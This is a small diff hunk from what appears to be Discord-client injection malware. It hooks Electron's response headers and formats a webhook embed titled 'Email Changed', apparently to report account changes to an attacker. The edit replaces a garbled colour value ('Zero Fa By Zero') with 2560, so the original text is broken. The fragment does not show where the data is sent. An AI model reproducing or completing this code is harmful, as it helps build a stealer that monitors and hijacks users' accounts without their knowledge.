@@ -307,7 +307,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
             avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
             embeds: [
                 {
-                    "color": Zero Fa By Zero,
+                    "color": 2560,
                     "fields": [
                         {
                             "name": "**Email Changed**",
